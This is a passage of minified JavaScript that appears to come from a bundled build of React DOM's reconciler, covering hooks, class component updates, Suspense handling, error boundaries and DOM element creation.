s=Ir(e),a={lane:s,action:r,hasEagerState:!1,eagerState:null,next:null};if(em(e))tm(t,a);else{var i=e.alternate;if(e.lanes===0&&(i===null||i.lanes===0)&&(i=t.lastRenderedReducer,i!==null))try{var l=t.lastRenderedState,o=i(l,r);if(a.hasEagerState=!0,a.eagerState=o,Ft(o,l)){var c=t.interleaved;c===null?(a.next=a,Gc(t)):(a.next=c.next,c.next=a),t.interleaved=a;return}}catch{}finally{}r=$f(e,t,a,s),r!==null&&(a=Xe(),Mt(r,e,s,a),rm(r,t,s))}}function em(e){var t=e.alternate;return e===we||t!==null&&t===we}function tm(e,t){Vn=Ci=!0;var r=e.pending;r===null?t.next=t:(t.next=r.next,r.next=t),e.pending=t}function rm(e,t,r){if(r&4194240){var s=t.lanes;s&=e.pendingLanes,r|=s,t.lanes=r,Ic(e,r)}}var Ti={readContext:_t,useCallback:Ve,useContext:Ve,useEffect:Ve,useImperativeHandle:Ve,useInsertionEffect:Ve,useLayoutEffect:Ve,useMemo:Ve,useReducer:Ve,useRef:Ve,useState:Ve,useDebugValue:Ve,useDeferredValue:Ve,useTransition:Ve,useMutableSource:Ve,useSyncExternalStore:Ve,useId:Ve,unstable_isNewReconciler:!1},ux={readContext:_t,useCallback:function(e,t){return Vt().memoizedState=[e,t===void 0?null:t],e},useContext:_t,useEffect:gd,useImperativeHandle:function(e,t,r){return r=r!=null?r.concat([e]):null,ai(4194308,4,Gf.bind(null,t,e),r)},useLayoutEffect:function(e,t){return ai(4194308,4,e,t)},useInsertionEffect:function(e,t){return ai(4,2,e,t)},useMemo:function(e,t){var r=Vt();return t=t===void 0?null:t,e=e(),r.memoizedState=[e,t],e},useReducer:function(e,t,r){var s=Vt();return t=r!==void 0?r(t):t,s.memoizedState=s.baseState=t,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:t},s.queue=e,e=e.dispatch=ox.bind(null,we,e),[s.memoizedState,e]},useRef:function(e){var t=Vt();return e={current:e},t.memoizedState=e},useState:xd,useDebugValue:su,useDeferredValue:function(e){return Vt().memoizedState=e},useTransition:function(){var e=xd(!1),t=e[0];return e=lx.bind(null,e[1]),Vt().memoizedState=e,[t,e]},useMutableSource:function(){},useSyncExternalStore:function(e,t,r){var s=we,a=Vt();if(ge){if(r===void 0)throw Error(A(407));r=r()}else{if(r=t(),$e===null)throw Error(A(349));vs&30||Mf(s,t,r)}a.memoizedState=r;var i={value:r,getSnapshot:t};return a.queue=i,gd(Bf.bind(null,s,i,e),[e]),s.flags|=2048,da(9,Ff.bind(null,s,i,r,t),void 0,null),r},useId:function(){var e=Vt(),t=$e.identifierPrefix;if(ge){var r=nr,s=sr;r=(s&~(1<<32-Dt(s)-1)).toString(32)+r,t=":"+t+"R"+r,r=ca++,0<r&&(t+="H"+r.toString(32)),t+=":"}else r=ix++,t=":"+t+"r"+r.toString(32)+":";return e.memoizedState=t},unstable_isNewReconciler:!1},dx={readContext:_t,useCallback:Yf,useContext:_t,useEffect:ru,useImperativeHandle:Jf,useInsertionEffect:Hf,useLayoutEffect:Kf,useMemo:Qf,useReducer:Kl,useRef:qf,useState:function(){return Kl(ua)},useDebugValue:su,useDeferredValue:function(e){var t=Nt();return Xf(t,Ae.memoizedState,e)},useTransition:function(){var e=Kl(ua)[0],t=Nt().memoizedState;return[e,t]},useMutableSource:Uf,useSyncExternalStore:Df,useId:Zf,unstable_isNewReconciler:!1},hx={readContext:_t,useCallback:Yf,useContext:_t,useEffect:ru,useImperativeHandle:Jf,useInsertionEffect:Hf,useLayoutEffect:Kf,useMemo:Qf,useReducer:Gl,useRef:qf,useState:function(){return Gl(ua)},useDebugValue:su,useDeferredValue:function(e){var t=Nt();return Ae===null?t.memoizedState=e:Xf(t,Ae.memoizedState,e)},useTransition:function(){var e=Gl(ua)[0],t=Nt().memoizedState;return[e,t]},useMutableSource:Uf,useSyncExternalStore:Df,useId:Zf,unstable_isNewReconciler:!1};function At(e,t){if(e&&e.defaultProps){t=je({},t),e=e.defaultProps;for(var r in e)t[r]===void 0&&(t[r]=e[r]);return t}return t}function Fo(e,t,r,s){t=e.memoizedState,r=r(s,t),r=r==null?t:je({},t,r),e.memoizedState=r,e.lanes===0&&(e.updateQueue.baseState=r)}var Qi={isMounted:function(e){return(e=e._reactInternals)?ks(e)===e:!1},enqueueSetState:function(e,t,r){e=e._reactInternals;var s=Xe(),a=Ir(e),i=ar(s,a);i.payload=t,r!=null&&(i.callback=r),t=Ar(e,i,a),t!==null&&(Mt(t,e,a,s),si(t,e,a))},enqueueReplaceState:function(e,t,r){e=e._reactInternals;var s=Xe(),a=Ir(e),i=ar(s,a);i.tag=1,i.payload=t,r!=null&&(i.callback=r),t=Ar(e,i,a),t!==null&&(Mt(t,e,a,s),si(t,e,a))},enqueueForceUpdate:function(e,t){e=e._reactInternals;var r=Xe(),s=Ir(e),a=ar(r,s);a.tag=2,t!=null&&(a.callback=t),t=Ar(e,a,s),t!==null&&(Mt(t,e,s,r),si(t,e,s))}};function yd(e,t,r,s,a,i,l){return e=e.stateNode,typeof e.shouldComponentUpdate=="function"?e.shouldComponentUpdate(s,i,l):t.prototype&&t.prototype.isPureReactComponent?!sa(r,s)||!sa(a,i):!0}function sm(e,t,r){var s=!1,a=Dr,i=t.contextType;return typeof i=="object"&&i!==null?i=_t(i):(a=at(t)?gs:Ke.current,s=t.contextTypes,i=(s=s!=null)?rn(e,a):Dr),t=new t(r,i),e.memoizedState=t.state!==null&&t.state!==void 0?t.state:null,t.updater=Qi,e.stateNode=t,t._reactInternals=e,s&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=a,e.__reactInternalMemoizedMaskedChildContext=i),t}function vd(e,t,r,s){e=t.state,typeof t.componentWillReceiveProps=="function"&&t.componentWillReceiveProps(r,s),typeof t.UNSAFE_componentWillReceiveProps=="function"&&t.UNSAFE_componentWillReceiveProps(r,s),t.state!==e&&Qi.enqueueReplaceState(t,t.state,null)}function Bo(e,t,r,s){var a=e.stateNode;a.props=r,a.state=e.memoizedState,a.refs={},Jc(e);var i=t.contextType;typeof i=="object"&&i!==null?a.context=_t(i):(i=at(t)?gs:Ke.current,a.context=rn(e,i)),a.state=e.memoizedState,i=t.getDerivedStateFromProps,typeof i=="function"&&(Fo(e,t,i,r),a.state=e.memoizedState),typeof t.getDerivedStateFromProps=="function"||typeof a.getSnapshotBeforeUpdate=="function"||typeof a.UNSAFE_componentWillMount!="function"&&typeof a.componentWillMount!="function"||(t=a.state,typeof a.componentWillMount=="function"&&a.componentWillMount(),typeof a.UNSAFE_componentWillMount=="function"&&a.UNSAFE_componentWillMount(),t!==a.state&&Qi.enqueueReplaceState(a,a.state,null),Si(e,r,a,s),a.state=e.memoizedState),typeof a.componentDidMount=="function"&&(e.flags|=4194308)}function ln(e,t){try{var r="",s=t;do r+=Mp(s),s=s.return;while(s);var a=r}catch(i){a=`
Error generating stack: `+i.message+`
`+i.stack}return{value:e,source:t,stack:a,digest:null}}function Jl(e,t,r){return{value:e,source:null,stack:r??null,digest:t??null}}function Wo(e,t){try{console.error(t.value)}catch(r){setTimeout(function(){throw r})}}var fx=typeof WeakMap=="function"?WeakMap:Map;function nm(e,t,r){r=ar(-1,r),r.tag=3,r.payload={element:null};var s=t.value;return r.callback=function(){Pi||(Pi=!0,Zo=s),Wo(e,t)},r}function am(e,t,r){r=ar(-1,r),r.tag=3;var s=e.type.getDerivedStateFromError;if(typeof s=="function"){var a=t.value;r.payload=function(){return s(a)},r.callback=function(){Wo(e,t)}}var i=e.stateNode;return i!==null&&typeof i.componentDidCatch=="function"&&(r.callback=function(){Wo(e,t),typeof s!="function"&&(Or===null?Or=new Set([this]):Or.add(this));var l=t.stack;this.componentDidCatch(t.value,{componentStack:l!==null?l:""})}),r}function wd(e,t,r){var s=e.pingCache;if(s===null){s=e.pingCache=new fx;var a=new Set;s.set(t,a)}else a=s.get(t),a===void 0&&(a=new Set,s.set(t,a));a.has(r)||(a.add(r),e=Ex.bind(null,e,t,r),t.then(e,e))}function bd(e){do{var t;if((t=e.tag===13)&&(t=e.memoizedState,t=t!==null?t.dehydrated!==null:!0),t)return e;e=e.return}while(e!==null);return null}function jd(e,t,r,s,a){return e.mode&1?(e.flags|=65536,e.lanes=a,e):(e===t?e.flags|=65536:(e.flags|=128,r.flags|=131072,r.flags&=-52805,r.tag===1&&(r.alternate===null?r.tag=17:(t=ar(-1,1),t.tag=2,Ar(r,t,1))),r.lanes|=1),e)}var mx=fr.ReactCurrentOwner,st=!1;function Qe(e,t,r,s){t.child=e===null?If(t,null,r,s):nn(t,e.child,r,s)}function kd(e,t,r,s,a){r=r.render;var i=t.ref;return Xs(t,a),s=eu(e,t,r,s,i,a),r=tu(),e!==null&&!st?(t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~a,dr(e,t,a)):(ge&&r&&Bc(t),t.flags|=1,Qe(e,t,s,a),t.child)}function _d(e,t,r,s,a){if(e===null){var i=r.type;return typeof i=="function"&&!du(i)&&i.defaultProps===void 0&&r.compare===null&&r.defaultProps===void 0?(t.tag=15,t.type=i,im(e,t,i,s,a)):(e=ci(r.type,null,s,t,t.mode,a),e.ref=t.ref,e.return=t,t.child=e)}if(i=e.child,!(e.lanes&a)){var l=i.memoizedProps;if(r=r.compare,r=r!==null?r:sa,r(l,s)&&e.ref===t.ref)return dr(e,t,a)}return t.flags|=1,e=$r(i,s),e.ref=t.ref,e.return=t,t.child=e}function im(e,t,r,s,a){if(e!==null){var i=e.memoizedProps;if(sa(i,s)&&e.ref===t.ref)if(st=!1,t.pendingProps=s=i,(e.lanes&a)!==0)e.flags&131072&&(st=!0);else return t.lanes=e.lanes,dr(e,t,a)}return Vo(e,t,r,s,a)}function lm(e,t,r){var s=t.pendingProps,a=s.children,i=e!==null?e.memoizedState:null;if(s.mode==="hidden")if(!(t.mode&1))t.memoizedState={baseLanes:0,cachePool:null,transitions:null},he(Hs,ct),ct|=r;else{if(!(r&1073741824))return e=i!==null?i.baseLanes|r:r,t.lanes=t.childLanes=1073741824,t.memoizedState={baseLanes:e,cachePool:null,transitions:null},t.updateQueue=null,he(Hs,ct),ct|=e,null;t.memoizedState={baseLanes:0,cachePool:null,transitions:null},s=i!==null?i.baseLanes:r,he(Hs,ct),ct|=s}else i!==null?(s=i.baseLanes|r,t.memoizedState=null):s=r,he(Hs,ct),ct|=s;return Qe(e,t,a,r),t.child}function om(e,t){var r=t.ref;(e===null&&r!==null||e!==null&&e.ref!==r)&&(t.flags|=512,t.flags|=2097152)}function Vo(e,t,r,s,a){var i=at(r)?gs:Ke.current;return i=rn(t,i),Xs(t,a),r=eu(e,t,r,s,i,a),s=tu(),e!==null&&!st?(t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~a,dr(e,t,a)):(ge&&s&&Bc(t),t.flags|=1,Qe(e,t,r,a),t.child)}function Nd(e,t,r,s,a){if(at(r)){var i=!0;bi(t)}else i=!1;if(Xs(t,a),t.stateNode===null)ii(e,t),sm(t,r,s),Bo(t,r,s,a),s=!0;else if(e===null){var l=t.stateNode,o=t.memoizedProps;l.props=o;var c=l.context,u=r.contextType;typeof u=="object"&&u!==null?u=_t(u):(u=at(r)?gs:Ke.current,u=rn(t,u));var h=r.getDerivedStateFromProps,p=typeof h=="function"||typeof l.getSnapshotBeforeUpdate=="function";p||typeof l.UNSAFE_componentWillReceiveProps!="function"&&typeof l.componentWillReceiveProps!="function"||(o!==s||c!==u)&&vd(t,l,s,u),vr=!1;var x=t.memoizedState;l.state=x,Si(t,s,l,a),c=t.memoizedState,o!==s||x!==c||nt.current||vr?(typeof h=="function"&&(Fo(t,r,h,s),c=t.memoizedState),(o=vr||yd(t,r,o,s,x,c,u))?(p||typeof l.UNSAFE_componentWillMount!="function"&&typeof l.componentWillMount!="function"||(typeof l.componentWillMount=="function"&&l.componentWillMount(),typeof l.UNSAFE_componentWillMount=="function"&&l.UNSAFE_componentWillMount()),typeof l.componentDidMount=="function"&&(t.flags|=4194308)):(typeof l.componentDidMount=="function"&&(t.flags|=4194308),t.memoizedProps=s,t.memoizedState=c),l.props=s,l.state=c,l.context=u,s=o):(typeof l.componentDidMount=="function"&&(t.flags|=4194308),s=!1)}else{l=t.stateNode,zf(e,t),o=t.memoizedProps,u=t.type===t.elementType?o:At(t.type,o),l.props=u,p=t.pendingProps,x=l.context,c=r.contextType,typeof c=="object"&&c!==null?c=_t(c):(c=at(r)?gs:Ke.current,c=rn(t,c));var v=r.getDerivedStateFromProps;(h=typeof v=="function"||typeof l.getSnapshotBeforeUpdate=="function")||typeof l.UNSAFE_componentWillReceiveProps!="function"&&typeof l.componentWillReceiveProps!="function"||(o!==p||x!==c)&&vd(t,l,s,c),vr=!1,x=t.memoizedState,l.state=x,Si(t,s,l,a);var f=t.memoizedState;o!==p||x!==f||nt.current||vr?(typeof v=="function"&&(Fo(t,r,v,s),f=t.memoizedState),(u=vr||yd(t,r,u,s,x,f,c)||!1)?(h||typeof l.UNSAFE_componentWillUpdate!="function"&&typeof l.componentWillUpdate!="function"||(typeof l.componentWillUpdate=="function"&&l.componentWillUpdate(s,f,c),typeof l.UNSAFE_componentWillUpdate=="function"&&l.UNSAFE_componentWillUpdate(s,f,c)),typeof l.componentDidUpdate=="function"&&(t.flags|=4),typeof l.getSnapshotBeforeUpdate=="function"&&(t.flags|=1024)):(typeof l.componentDidUpdate!="function"||o===e.memoizedProps&&x===e.memoizedState||(t.flags|=4),typeof l.getSnapshotBeforeUpdate!="function"||o===e.memoizedProps&&x===e.memoizedState||(t.flags|=1024),t.memoizedProps=s,t.memoizedState=f),l.props=s,l.state=f,l.context=c,s=u):(typeof l.componentDidUpdate!="function"||o===e.memoizedProps&&x===e.memoizedState||(t.flags|=4),typeof l.getSnapshotBeforeUpdate!="function"||o===e.memoizedProps&&x===e.memoizedState||(t.flags|=1024),s=!1)}return qo(e,t,r,s,i,a)}function qo(e,t,r,s,a,i){om(e,t);var l=(t.flags&128)!==0;if(!s&&!l)return a&&ud(t,r,!1),dr(e,t,i);s=t.stateNode,mx.current=t;var o=l&&typeof r.getDerivedStateFromError!="function"?null:s.render();return t.flags|=1,e!==null&&l?(t.child=nn(t,e.child,null,i),t.child=nn(t,null,o,i)):Qe(e,t,o,i),t.memoizedState=s.state,a&&ud(t,r,!0),t.child}function cm(e){var t=e.stateNode;t.pendingContext?cd(e,t.pendingContext,t.pendingContext!==t.context):t.context&&cd(e,t.context,!1),Yc(e,t.containerInfo)}function Sd(e,t,r,s,a){return sn(),Vc(a),t.flags|=256,Qe(e,t,r,s),t.child}var Ho={dehydrated:null,treeContext:null,retryLane:0};function Ko(e){return{baseLanes:e,cachePool:null,transitions:null}}function um(e,t,r){var s=t.pendingProps,a=ve.current,i=!1,l=(t.flags&128)!==0,o;if((o=l)||(o=e!==null&&e.memoizedState===null?!1:(a&2)!==0),o?(i=!0,t.flags&=-129):(e===null||e.memoizedState!==null)&&(a|=1),he(ve,a&1),e===null)return Do(t),e=t.memoizedState,e!==null&&(e=e.dehydrated,e!==null)?(t.mode&1?e.data==="$!"?t.lanes=8:t.lanes=1073741824:t.lanes=1,null):(l=s.children,e=s.fallback,i?(s=t.mode,i=t.child,l={mode:"hidden",children:l},!(s&1)&&i!==null?(i.childLanes=0,i.pendingProps=l):i=el(l,s,0,null),e=xs(e,s,r,null),i.return=t,e.return=t,i.sibling=e,t.child=i,t.child.memoizedState=Ko(r),t.memoizedState=Ho,e):nu(t,l));if(a=e.memoizedState,a!==null&&(o=a.dehydrated,o!==null))return px(e,t,l,s,o,a,r);if(i){i=s.fallback,l=t.mode,a=e.child,o=a.sibling;var c={mode:"hidden",children:s.children};return!(l&1)&&t.child!==a?(s=t.child,s.childLanes=0,s.pendingProps=c,t.deletions=null):(s=$r(a,c),s.subtreeFlags=a.subtreeFlags&14680064),o!==null?i=$r(o,i):(i=xs(i,l,r,null),i.flags|=2),i.return=t,s.return=t,s.sibling=i,t.child=s,s=i,i=t.child,l=e.child.memoizedState,l=l===null?Ko(r):{baseLanes:l.baseLanes|r,cachePool:null,transitions:l.transitions},i.memoizedState=l,i.childLanes=e.childLanes&~r,t.memoizedState=Ho,s}return i=e.child,e=i.sibling,s=$r(i,{mode:"visible",children:s.children}),!(t.mode&1)&&(s.lanes=r),s.return=t,s.sibling=null,e!==null&&(r=t.deletions,r===null?(t.deletions=[e],t.flags|=16):r.push(e)),t.child=s,t.memoizedState=null,s}function nu(e,t){return t=el({mode:"visible",children:t},e.mode,0,null),t.return=e,e.child=t}function Fa(e,t,r,s){return s!==null&&Vc(s),nn(t,e.child,null,r),e=nu(t,t.pendingProps.children),e.flags|=2,t.memoizedState=null,e}function px(e,t,r,s,a,i,l){if(r)return t.flags&256?(t.flags&=-257,s=Jl(Error(A(422))),Fa(e,t,l,s)):t.memoizedState!==null?(t.child=e.child,t.flags|=128,null):(i=s.fallback,a=t.mode,s=el({mode:"visible",children:s.children},a,0,null),i=xs(i,a,l,null),i.flags|=2,s.return=t,i.return=t,s.sibling=i,t.child=s,t.mode&1&&nn(t,e.child,null,l),t.child.memoizedState=Ko(l),t.memoizedState=Ho,i);if(!(t.mode&1))return Fa(e,t,l,null);if(a.data==="$!"){if(s=a.nextSibling&&a.nextSibling.dataset,s)var o=s.dgst;return s=o,i=Error(A(419)),s=Jl(i,s,void 0),Fa(e,t,l,s)}if(o=(l&e.childLanes)!==0,st||o){if(s=$e,s!==null){switch(l&-l){case 4:a=2;break;case 16:a=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:a=32;break;case 536870912:a=268435456;break;default:a=0}a=a&(s.suspendedLanes|l)?0:a,a!==0&&a!==i.retryLane&&(i.retryLane=a,ur(e,a),Mt(s,e,a,-1))}return uu(),s=Jl(Error(A(421))),Fa(e,t,l,s)}return a.data==="$?"?(t.flags|=128,t.child=e.child,t=Cx.bind(null,e),a._reactRetry=t,null):(e=i.treeContext,ht=Pr(a.nextSibling),mt=t,ge=!0,Lt=null,e!==null&&(vt[wt++]=sr,vt[wt++]=nr,vt[wt++]=ys,sr=e.id,nr=e.overflow,ys=t),t=nu(t,s.children),t.flags|=4096,t)}function Ed(e,t,r){e.lanes|=t;var s=e.alternate;s!==null&&(s.lanes|=t),Mo(e.return,t,r)}function Yl(e,t,r,s,a){var i=e.memoizedState;i===null?e.memoizedState={isBackwards:t,rendering:null,renderingStartTime:0,last:s,tail:r,tailMode:a}:(i.isBackwards=t,i.rendering=null,i.renderingStartTime=0,i.last=s,i.tail=r,i.tailMode=a)}function dm(e,t,r){var s=t.pendingProps,a=s.revealOrder,i=s.tail;if(Qe(e,t,s.children,r),s=ve.current,s&2)s=s&1|2,t.flags|=128;else{if(e!==null&&e.flags&128)e:for(e=t.child;e!==null;){if(e.tag===13)e.memoizedState!==null&&Ed(e,r,t);else if(e.tag===19)Ed(e,r,t);else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===t)break e;for(;e.sibling===null;){if(e.return===null||e.return===t)break e;e=e.return}e.sibling.return=e.return,e=e.sibling}s&=1}if(he(ve,s),!(t.mode&1))t.memoizedState=null;else switch(a){case"forwards":for(r=t.child,a=null;r!==null;)e=r.alternate,e!==null&&Ei(e)===null&&(a=r),r=r.sibling;r=a,r===null?(a=t.child,t.child=null):(a=r.sibling,r.sibling=null),Yl(t,!1,a,r,i);break;case"backwards":for(r=null,a=t.child,t.child=null;a!==null;){if(e=a.alternate,e!==null&&Ei(e)===null){t.child=a;break}e=a.sibling,a.sibling=r,r=a,a=e}Yl(t,!0,r,null,i);break;case"together":Yl(t,!1,null,null,void 0);break;default:t.memoizedState=null}return t.child}function ii(e,t){!(t.mode&1)&&e!==null&&(e.alternate=null,t.alternate=null,t.flags|=2)}function dr(e,t,r){if(e!==null&&(t.dependencies=e.dependencies),ws|=t.lanes,!(r&t.childLanes))return null;if(e!==null&&t.child!==e.child)throw Error(A(153));if(t.child!==null){for(e=t.child,r=$r(e,e.pendingProps),t.child=r,r.return=t;e.sibling!==null;)e=e.sibling,r=r.sibling=$r(e,e.pendingProps),r.return=t;r.sibling=null}return t.child}function xx(e,t,r){switch(t.tag){case 3:cm(t),sn();break;case 5:Lf(t);break;case 1:at(t.type)&&bi(t);break;case 4:Yc(t,t.stateNode.containerInfo);break;case 10:var s=t.type._context,a=t.memoizedProps.value;he(_i,s._currentValue),s._currentValue=a;break;case 13:if(s=t.memoizedState,s!==null)return s.dehydrated!==null?(he(ve,ve.current&1),t.flags|=128,null):r&t.child.childLanes?um(e,t,r):(he(ve,ve.current&1),e=dr(e,t,r),e!==null?e.sibling:null);he(ve,ve.current&1);break;case 19:if(s=(r&t.childLanes)!==0,e.flags&128){if(s)return dm(e,t,r);t.flags|=128}if(a=t.memoizedState,a!==null&&(a.rendering=null,a.tail=null,a.lastEffect=null),he(ve,ve.current),s)break;return null;case 22:case 23:return t.lanes=0,lm(e,t,r)}return dr(e,t,r)}var hm,Go,fm,mm;hm=function(e,t){for(var r=t.child;r!==null;){if(r.tag===5||r.tag===6)e.appendChild(r.stateNode);else if(r.tag!==4&&r.child!==null){r.child.return=r,r=r.child;continue}if(r===t)break;for(;r.sibling===null;){if(r.return===null||r.return===t)return;r=r.return}r.sibling.return=r.return,r=r.sibling}};Go=function(){};fm=function(e,t,r,s){var a=e.memoizedProps;if(a!==s){e=t.stateNode,fs(Gt.current);var i=null;switch(r){case"input":a=xo(e,a),s=xo(e,s),i=[];break;case"select":a=je({},a,{value:void 0}),s=je({},s,{value:void 0}),i=[];break;case"textarea":a=vo(e,a),s=vo(e,s),i=[];break;default:typeof a.onClick!="function"&&typeof s.onClick=="function"&&(e.onclick=vi)}bo(r,s);var l;r=null;for(u in a)if(!s.hasOwnProperty(u)&&a.hasOwnProperty(u)&&a[u]!=null)if(u==="style"){var o=a[u];for(l in o)o.hasOwnProperty(l)&&(r||(r={}),r[l]="")}else u!=="dangerouslySetInnerHTML"&&u!=="children"&&u!=="suppressContentEditableWarning"&&u!=="suppressHydrationWarning"&&u!=="autoFocus"&&(Yn.hasOwnProperty(u)?i||(i=[]):(i=i||[]).push(u,null));for(u in s){var c=s[u];if(o=a!=null?a[u]:void 0,s.hasOwnProperty(u)&&c!==o&&(c!=null||o!=null))if(u==="style")if(o){for(l in o)!o.hasOwnProperty(l)||c&&c.hasOwnProperty(l)||(r||(r={}),r[l]="");for(l in c)c.hasOwnProperty(l)&&o[l]!==c[l]&&(r||(r={}),r[l]=c[l])}else r||(i||(i=[]),i.push(u,r)),r=c;else u==="dangerouslySetInnerHTML"?(c=c?c.__html:void 0,o=o?o.__html:void 0,c!=null&&o!==c&&(i=i||[]).push(u,c)):u==="children"?typeof c!="string"&&typeof c!="number"||(i=i||[]).push(u,""+c):u!=="suppressContentEditableWarning"&&u!=="suppressHydrationWarning"&&(Yn.hasOwnProperty(u)?(c!=null&&u==="onScroll"&&pe("scroll",e),i||o===c||(i=[])):(i=i||[]).push(u,c))}r&&(i=i||[]).push("style",r);var u=i;(t.updateQueue=u)&&(t.flags|=4)}};mm=function(e,t,r,s){r!==s&&(t.flags|=4)};function Pn(e,t){if(!ge)switch(e.tailMode){case"hidden":t=e.tail;for(var r=null;t!==null;)t.alternate!==null&&(r=t),t=t.sibling;r===null?e.tail=null:r.sibling=null;break;case"collapsed":r=e.tail;for(var s=null;r!==null;)r.alternate!==null&&(s=r),r=r.sibling;s===null?t||e.tail===null?e.tail=null:e.tail.sibling=null:s.sibling=null}}function qe(e){var t=e.alternate!==null&&e.alternate.child===e.child,r=0,s=0;if(t)for(var a=e.child;a!==null;)r|=a.lanes|a.childLanes,s|=a.subtreeFlags&14680064,s|=a.flags&14680064,a.return=e,a=a.sibling;else for(a=e.child;a!==null;)r|=a.lanes|a.childLanes,s|=a.subtreeFlags,s|=a.flags,a.return=e,a=a.sibling;return e.subtreeFlags|=s,e.childLanes=r,t}function gx(e,t,r){var s=t.pendingProps;switch(Wc(t),t.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return qe(t),null;case 1:return at(t.type)&&wi(),qe(t),null;case 3:return s=t.stateNode,an(),xe(nt),xe(Ke),Xc(),s.pendingContext&&(s.context=s.pendingContext,s.pendingContext=null),(e===null||e.child===null)&&(Da(t)?t.flags|=4:e===null||e.memoizedState.isDehydrated&&!(t.flags&256)||(t.flags|=1024,Lt!==null&&(rc(Lt),Lt=null))),Go(e,t),qe(t),null;case 5:Qc(t);var a=fs(oa.current);if(r=t.type,e!==null&&t.stateNode!=null)fm(e,t,r,s,a),e.ref!==t.ref&&(t.flags|=512,t.flags|=2097152);else{if(!s){if(t.stateNode===null)throw Error(A(166));return qe(t),null}if(e=fs(Gt.current),Da(t)){s=t.stateNode,r=t.type;var i=t.memoizedProps;switch(s[qt]=t,s[ia]=i,e=(t.mode&1)!==0,r){case"dialog":pe("cancel",s),pe("close",s);break;case"iframe":case"object":case"embed":pe("load",s);break;case"video":case"audio":for(a=0;a<Ln.length;a++)pe(Ln[a],s);break;case"source":pe("error",s);break;case"img":case"image":case"link":pe("error",s),pe("load",s);break;case"details":pe("toggle",s);break;case"input":zu(s,i),pe("invalid",s);break;case"select":s._wrapperState={wasMultiple:!!i.multiple},pe("invalid",s);break;case"textarea":Uu(s,i),pe("invalid",s)}bo(r,i),a=null;for(var l in i)if(i.hasOwnProperty(l)){var o=i[l];l==="children"?typeof o=="string"?s.textContent!==o&&(i.suppressHydrationWarning!==!0&&Ua(s.textContent,o,e),a=["children",o]):typeof o=="number"&&s.textContent!==""+o&&(i.suppressHydrationWarning!==!0&&Ua(s.textContent,o,e),a=["children",""+o]):Yn.hasOwnProperty(l)&&o!=null&&l==="onScroll"&&pe("scroll",s)}switch(r){case"input":Ra(s),Lu(s,i,!0);break;case"textarea":Ra(s),Du(s);break;case"select":case"option":break;default:typeof i.onClick=="function"&&(s.onclick=vi)}s=a,t.updateQueue=s,s!==null&&(t.flags|=4)}else{l=a.nodeType===9?a:a.ownerDocument,e==="http://www.w3.org/1999/xhtml"&&(e=Fh(r)),e==="http://www.w3.org/1999/xhtml"?r==="script"?(e=l.createElement("div"),e.innerHTML="<script><\/script>",e=e.removeChild(e.firstChild)):typeof s.is=="string"?e=l.createElement(r,{is:s.is}):(e=l.createElement(r),r==="select"&&(l=e,s.multiple?l.multiple=!0:s.size&&(l.size=s.size))):e=l.createElementNS(e,r),e[qt]=t,e[ia]=s,hm(e,t,!1,!1),t.stateNode=e;e:{switch(l=jo(r,s),r){case"dialog":pe("cancel",e),pe("close",e),a=s;break;case"iframe":case"object":case"embed":pe("load",e),a=s;break;case"video":case"audio":for(a=0;a<Ln.length;a++)pe(Ln[a],e);a=s;break;case"source":pe("error",e),a=s;break;case"img":case"image":case"link":pe("error",e),pe("load",e),a=s;break;case"details":pe("toggle",e),a=s;break;case"input":zu(e,s),a=xo(e,s),pe("invalid",e);break;case"option":a=s;break;case"select":e._wrapperState={wasMultiple:!!s.multiple},a=je({},s,{value:void 0}),pe("invalid",e);break;case"textarea":Uu(e,s),a=vo(e,s),pe("invalid",e);break;default:a=s}bo(r,a),o=a;for(i in o)if(o.hasOwnProperty(i)){var c=o[i];i==="style"?Vh(e,c):i==="dangerouslySetInnerHTML"?(c=c?c.__html:void 0,c!=null&&Bh(e,c)):i==="children"?typeof c=="string"?(r!=="textarea"||c!=="")&&Qn(e,c):typeof c=="number"&&Qn(e,""+c):i!=="suppressContentEditableWarning"&&i!=="suppressHydrationWarning"&&i!=="autoFocus"&&(Yn.hasOwnProperty(i)?c!=null&&i==="onScroll"&&pe("scroll",e):c!=null&&Cc(e,i,c,l))}switch(r){case"input":Ra(e),Lu(e,s,!1);break;case"textarea":Ra(e),Du(e);break;case"option":s.value!=null&&e.setAttribute("value",""+Ur(s.value));break;case"select":e.multiple=!!s.multiple,i=s.value,i!=null?Gs(e,!!s.multiple,i,!1):s.defaultValue!=null&&Gs(e,!!s.multiple,s.defaultValue,!0);break;default:typeof a.onClick=="function"&&(e.onclick=vi)}switch(r){case"button":case"input":case"select":case"textarea":s=!!s.autoFocus;break e;case"img":s=!0;break e;default:s=!1}}s&&(t.flags|=4)}t.ref!==null&&(t.flags|=512,t.flags|=2097152)}return qe(t),null;case 6:if(e&&t.stateNode!=null)mm(e,t,e.memoizedProps,s);else{if(typeof s!="string"&&t.stateNode===null)throw Error(A(166));if(r=fs(oa.current),fs(Gt.current),Da(t)){if(s=t.stateNode,r=t.memoizedProps,s[qt]=t,(i=s.nodeValue!==r)&&(e=mt,e!==null))switch(e.tag){case 3:Ua(s.nodeValue,r,(e.mode&1)!==0);break;case 5:e.memoizedProps.suppressHydrationWarning!==!0&&Ua(s.nodeValue,r,(e.mode&1)!==0)}i&&(t.flags|=4)}else s=(r.nodeType===9?r:r.ownerDocument).createTextNode(s),s[qt]=t,t.stateNode=s}return qe(t),null;case 13:if(xe(ve),s=t.memoizedState,e===null||e.memoizedState!==null&&e.memoizedState.dehydrated!==null){if(ge&&ht!==null&&t.mode&1&&!(t.flags&128))Af(),sn(),t.flags|=98560,i=!1;else if(i=Da(t),s!==null&&s.dehydrated!==null){if(e===null){if(!i)throw Error(A(318));if(i=t.memoizedState,i=i!==null?i.dehydrated:null,!i)throw Error(A(317));i[qt]=t}else sn(),!(t.flags&128)&&(t.memoizedState=null),t.flags|=4;qe(t),i=!1}else Lt!==null&&(rc(Lt),Lt=null),i=!0;if(!i)return t.flags&65536?t:null}return 